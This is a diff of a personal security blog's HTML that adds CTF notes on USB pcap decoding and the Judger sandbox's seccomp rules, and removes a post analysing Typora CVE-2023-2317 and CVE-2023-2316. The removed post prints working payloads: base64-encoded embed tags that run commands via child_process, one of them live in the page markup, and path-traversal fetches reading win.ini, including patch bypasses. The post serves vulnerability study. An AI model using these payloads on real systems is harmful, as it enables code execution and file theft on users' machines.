@@ -156,6 +156,104 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/python_bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
+      <meta itemprop="name" content="Paul C">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paul C's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/categories/CTF/python_bypass/" class="post-title-link" itemprop="url">Untitled</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-09 17:48:02" itemprop="dateCreated datePublished" datetime="2023-10-09T17:48:02+08:00">2023-10-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-09 11:14:24" itemprop="dateModified" datetime="2023-09-09T11:14:24+08:00">2023-09-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="LessEQualmore"><a href="#LessEQualmore" class="headerlink" title="LessEQualmore"></a>LessEQualmore</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc chal-lessequalmore.chal.hitconctf.com 11111</span><br><span class="line">flag&#123;1&#125;</span><br><span class="line">*** Flag Checker ***</span><br><span class="line">You entered:</span><br><span class="line">flag&#123;1&#125;</span><br><span class="line">Sorry, wrong flag!</span><br></pre></td></tr></table></figure>
+<h2 id="Not-just-usbpcap"><a href="#Not-just-usbpcap" class="headerlink" title="Not just usbpcap"></a>Not just usbpcap</h2><h3 id="鼠标协议"><a href="#鼠标协议" class="headerlink" title="鼠标协议"></a>鼠标协议</h3><pre><code>  每一个数据包的数据区有四个字节，
+</code></pre><p>第一个字节代表按键，当取 0x00 时，代表没有按键、为 0x01 时，代表按左键，为 0x02 时，代表当前按键为右键。第二个字节可以看成是一个 signed byte 类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。 </p>
+<p>键盘数据包的数据长度为 8 个字节，击键信息集中在第 3 个字节 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r ./release.pcapng -T fields -e usb.capdata &gt;usbdata.txt</span><br><span class="line">python UsbKeyboardDataHacker.py ./release.pcapng</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">l USB UART  异步接收传送器</span><br><span class="line">l USB HID 交互式人性化接口</span><br><span class="line">l USB Memory  数据存储</span><br><span class="line">Audio/Video Distribution Transport Protocol）：</span><br><span class="line"></span><br><span class="line">AVDTP是一种蓝牙协议，用于传输音频和视频数据。它定义了在蓝牙设备之间传输多</span><br><span class="line">媒体数据流的规则和方法。AVDTP的作用是管理多媒体数据的流动，包括数据的传输、控制和同步。</span><br><span class="line">HCI_EVT（Host Controller Interface Event）：</span><br><span class="line"></span><br><span class="line">HCI_EVT是蓝牙协议栈中的一部分，用于管理与蓝牙硬件控制器之间的通信。它定义了一组事件和命令，允许主机设备与蓝牙硬件进行交互，包括连接、数据传输和配置等操作。</span><br><span class="line">USBHUB（USB Hub Protocol）：</span><br><span class="line"></span><br><span class="line">USBHUB是与USB（Universal Serial Bus）相关的协议，用于管理USB集线器（Hub）。USB集线器允许多个USB设备连接到单个USB端口，USBHUB协议定义了集线器的工作原理和与主机设备之间的通信方式。</span><br><span class="line">RTP（Real-time Transport Protocol）：</span><br><span class="line"></span><br><span class="line">RTP是一种用于实时数据传输的协议，通常用于音频和视频流的传输。它提供了时间同步、流标识和数据流传输的机制，以确保实时媒体数据能够以低延迟和高质量传输。RTP通常与RTCP（RTP Control Protocol）一起使用，后者用于监控和管理传输质量。</span><br></pre></td></tr></table></figure>
+<p> <code>Bus 002 Device 002</code> 代表 <code>usb</code> 设备正常连接， </p>
+<h3 id="蓝牙协议"><a href="#蓝牙协议" class="headerlink" title="蓝牙协议"></a>蓝牙协议</h3><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p><img src="/categories/CTF/python_bypass/1694226682107.png" alt="1694226682107"></p>
+<h3 id="后台仓库"><a href="#后台仓库" class="headerlink" title="后台仓库"></a>后台仓库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/QingdaoU/Judger</span><br></pre></td></tr></table></figure>
+<p>main.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">max_process_number</span><br><span class="line">max_output_size</span><br><span class="line">exe_path</span><br><span class="line">input_path &quot;/dev/stdin&quot;</span><br><span class="line">output_path</span><br><span class="line">error_path &quot;/dev/stderr&quot;</span><br><span class="line">args</span><br><span class="line"> env</span><br><span class="line"> log_path judger.log</span><br><span class="line"> seccomp_rule_name seccomp_rule_name-&gt;sval[0]</span><br><span class="line"> uid 65534</span><br><span class="line"> gid 65534</span><br></pre></td></tr></table></figure>
+<p>child.c  child_process</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proc = subprocess.Popen(proc_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = proc.communicate()</span><br><span class="line">return json.loads(out.decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure>
+<p>general.c</p>
+<ul>
+<li><p>socket、fork、vfork、kill；</p>
+<ul>
+<li>execveat</li>
+</ul>
+<p>禁止以w、rw使用open、openat；</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//c_cpp.c</span><br><span class="line"></span><br><span class="line">&#123;SCMP_SYS(read), SCMP_SYS(fstat),</span><br><span class="line">SCMP_SYS(mmap), SCMP_SYS(mprotect),</span><br><span class="line">SCMP_SYS(munmap), SCMP_SYS(uname),</span><br><span class="line">SCMP_SYS(arch_prctl), SCMP_SYS(brk),</span><br><span class="line">SCMP_SYS(access), SCMP_SYS(exit_group),</span><br><span class="line">SCMP_SYS(close), SCMP_SYS(readlink),</span><br><span class="line">SCMP_SYS(sysinfo), SCMP_SYS(write),</span><br><span class="line">SCMP_SYS(writev), SCMP_SYS(lseek),</span><br><span class="line">SCMP_SYS(clock_gettime), SCMP_SYS(pread64)&#125;; </span><br></pre></td></tr></table></figure>
+<p>  不让写文件时：</p>
+<p>禁止以w、rw使用open、openat；</p>
+<p>或者在允许写文件时：</p>
+<p> 允许进程调用 <code>open</code> 系统调用。 </p>
+<p> 允许进程调用 <code>openat</code> 系统调用，类似于 <code>open</code>，但可以指定文件的相对路径。 </p>
+<p> 允许进程调用 <code>dup2</code> 系统调用，用于复制文件描述符到指定的文件描述符号码。 </p>
+<p> 允许进程调用 <code>dup3</code> 系统调用，类似于 <code>dup2</code>，但支持更多选项 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">max_memory=1024 * 1024 * 128, max_stack=32 * 1024 * 1024,</span><br><span class="line">                   max_process_number=200, max_output_size=10000, exe_path=&quot;1.out&quot;,</span><br><span class="line">                   input_path=&quot;1.in&quot;, output_path=&quot;1.out&quot;, error_path=&quot;1.out&quot;,</span><br><span class="line">                   args=args, env=[&quot;a=&quot;], log_path=&quot;1.log&quot;,</span><br><span class="line">                   seccomp_rule_name=&quot;1.so&quot;, uid=0, gid=0)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#base.py</span><br><span class="line">   config = &#123;&quot;max_cpu_time&quot;: 1000,</span><br><span class="line">                  &quot;max_real_time&quot;: 3000,</span><br><span class="line">                  &quot;max_memory&quot;: 128 * 1024 * 1024,</span><br><span class="line">                  &quot;max_stack&quot;: 32 * 1024 * 1024,</span><br><span class="line">                  &quot;max_process_number&quot;: 10,</span><br><span class="line">                  &quot;max_output_size&quot;: 1024 * 1024,</span><br><span class="line">                  &quot;exe_path&quot;: &quot;/bin/ls&quot;,</span><br><span class="line">                  &quot;input_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;output_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;error_path&quot;: &quot;/dev/null&quot;,</span><br><span class="line">                  &quot;args&quot;: [],</span><br><span class="line">                  &quot;env&quot;: [&quot;env=judger_test&quot;, &quot;test=judger&quot;],</span><br><span class="line">                  &quot;log_path&quot;: &quot;judger_test.log&quot;,</span><br><span class="line">                  &quot;seccomp_rule_name&quot;: None,</span><br><span class="line">                  &quot;uid&quot;: 0,</span><br><span class="line">                  &quot;gid&quot;: 0&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def init_workspace(self, language):</span><br><span class="line">    base_workspace = &quot;/tmp&quot;</span><br><span class="line">    workspace = os.path.join(base_workspace, language)</span><br><span class="line">    shutil.rmtree(workspace, ignore_errors=True)</span><br><span class="line">    os.makedirs(workspace)</span><br><span class="line">    return workspace</span><br><span class="line"></span><br><span class="line">def tearDown(self):</span><br><span class="line">    shutil.rmtree(self.workspace, ignore_errors=True)</span><br><span class="line"></span><br><span class="line">def rand_str(self):</span><br><span class="line">    return &quot;&quot;.join([random.choice(&quot;123456789abcdef&quot;) for _ in range(12)])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>相当于12位密码，难以预测。</p>
+<h2 id="Lisp-js"><a href="#Lisp-js" class="headerlink" title="Lisp.js"></a>Lisp.js</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/Notes/%E5%86%85%E5%AD%98%E9%A9%AC/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -965,157 +1063,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/CVE-2023-2317/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/CVE-2023-2317/" class="post-title-link" itemprop="url">CVE-2023-2317 Typora远程代码执行漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-08-27 14:19:49" itemprop="dateCreated datePublished" datetime="2023-08-27T14:19:49+08:00">2023-08-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-30 12:18:28" itemprop="dateModified" datetime="2023-08-30T12:18:28+08:00">2023-08-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hMMqhVxx8YBokNrSM-__fQ">CVE-2023-2317 Typora远程代码执行漏洞</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.ctfiot.com/131732.html">CVE-2023-2971Typora Local File Disclosure (Patch Bypass)</a></p>
-</blockquote>
-<p> Windows和Linux版本1.6.7之前的Typora中的updater/update.html中存在基于DOM的XSS，该漏洞允许通过加载特制的markdown文件从而使得执行任意JavaScript代码。如果用户打开恶意markdown文件或者从恶意网页复制文本并将其粘贴到Typora，通过在＜embed＞标签中引用update.html，则可以利用此漏洞，此外，攻击者可以使用特权接口reqnode访问节点模块child_process并执行任意系统命令。 </p>
-<p>在Typora中嵌入下面的两个标签，渲染后人眼无法看到任何内容。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br></pre></td></tr></table></figure>
-<p>其中，</p>
-<p> %22 :”</p>
-<p> %2f :/</p>
-<p> %3c :&lt;</p>
-<p>base64编码的内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reqnode(&#x27;child_process&#x27;).exec(</span><br><span class="line">(&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)</span><br><span class="line">[navigator.platform.substr(0,5)])</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec(</span><br><span class="line">(&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)</span><br><span class="line">[navigator.platform.substr(0,5)])</span><br></pre></td></tr></table></figure>
-<embed style="height:0;" src="typora://resources/app/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]">
-
-<h2 id="2317漏洞原理"><a href="#2317漏洞原理" class="headerlink" title="2317漏洞原理"></a>2317漏洞原理</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">      <span class="keyword">var</span> curVersion = <span class="regexp">/[?&amp;]curVersion=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">var</span> newVersion = <span class="regexp">/[?&amp;]newVersion=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">var</span> labels = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="built_in">decodeURIComponent</span>(<span class="regexp">/[?&amp;]labels=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#sum&quot;</span>).<span class="property">innerText</span> = labels[<span class="number">4</span>] + <span class="string">&quot; &quot;</span> + labels[<span class="number">5</span>].<span class="title function_">replace</span>(<span class="string">&quot;$1&quot;</span>, newVersion).<span class="title function_">replace</span>(<span class="string">&quot;$2&quot;</span>, curVersion);</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;[data-label]&quot;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">dom</span>)&#123;</span><br><span class="line">        dom.<span class="property">innerHTML</span> = labels[dom.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-label&quot;</span>) - <span class="number">0</span>];</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> autoUpdateInput = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#preference-enable-auto-update&quot;</span>)</span><br><span class="line">      autoUpdateInput.<span class="property">checked</span> = !!isAutoUpdateEnabled;</span><br><span class="line">      autoUpdateInput.<span class="property">onchange</span> = toggleAutoUpdate;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p> <code>window.location.search</code>: 返回URL的查询字符串，即”?”后面的部分。 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curVersion=111&amp;newVersion=222&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>数组索引 <code>0</code> 将包含整个匹配，例如：<code>newVersion=222</code></li>
-<li>数组索引 <code>1</code> 将只包含捕获组的匹配，即：<code>222</code></li>
-</ul>
-<p>此时，curVersion被设置为111，newVersion被设置为222。</p>
-<p>JSON.parse后，labels被设置为Javascript数组：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;b64_string&#x27;))&gt;&lt;/svg&gt;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]</span><br></pre></td></tr></table></figure>
-<p>含有6个元素的labels数组，</p>
-<p> 在顶级窗口上下文中执行解码后的字符串作为JavaScript代码。 </p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在0.9beta版本里，发现并不能够成功执行payload.</p>
-<p>首先，是updater.html的路径不对。</p>
-<p><a href="#2971漏洞原理">1.6.7之后的版本</a>，可以把”typora://app/typemark”解析成 [Typora Installation Absolute Path]/resources/ ，但是0.9版本没有这个功能；</p>
-<p>而且两个版本的目录也有很大差异。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typora://resources/app/updater/updater.html</span><br></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://resources/app/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line">​```</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line">​```</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://resources/app/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgd3d3LmV4cHBvYy5vcmcnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line">​```</span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;notepad www.exppoc.org&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
-<p>修改后，发现成功触发到updater.html。</p>
-<p><img src="/categories/CTF/CVE-2023-2317/1693365459596.png" alt="1693365459596"></p>
-<p> 但是SVG元素的<code>onload</code>事件代码被浏览器阻止了，因为它尝试在一个跨域的frame中访问当前的frame，这违反了同源策略。</p>
-<p><img src="/categories/CTF/CVE-2023-2317/1693365876426.png" alt="1693365876426"></p>
-<h2 id="CVE-2023-2316-路径遍历漏洞"><a href="#CVE-2023-2316-路径遍历漏洞" class="headerlink" title="CVE-2023-2316 路径遍历漏洞"></a>CVE-2023-2316 路径遍历漏洞</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;typora://app/C:/windows/win.ini&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(r)&#125;)</span><br></pre></td></tr></table></figure>
-<p><img src="/categories/CTF/CVE-2023-2317/1693367774824.png" alt="1693367774824"></p>
-<p>仍然是针对Typora1.6.5的，0.9很安全。</p>
-<h3 id="2316漏洞修补"><a href="#2316漏洞修补" class="headerlink" title="2316漏洞修补"></a>2316漏洞修补</h3><p>在Typora 1.6.5中添加了一个健全性检查， </p>
-<p><code>[1]</code> 以确保路径以字符串 <code>typemark</code> 开头，</p>
-<p>[2]消除了传递以 <code>/</code>  或者<code>C:\\</code> 开头的绝对路径的可能性。 </p>
-<h3 id="2316修补的绕过"><a href="#2316修补的绕过" class="headerlink" title="2316修补的绕过"></a>2316修补的绕过</h3><ul>
-<li><p>Approach 1: Using <code>..%5C</code> (Windows-only):<br>方法 1：使用 URL编码<code>..%5C</code> （仅限 Windows）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;typora://app/typemark/..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(r)&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Approach 2: Passing <code>../</code> in URL fragment <code>#</code>:<br>方法 2：URL 片段 <code>#</code> 中传入 <code>../</code> ：</p>
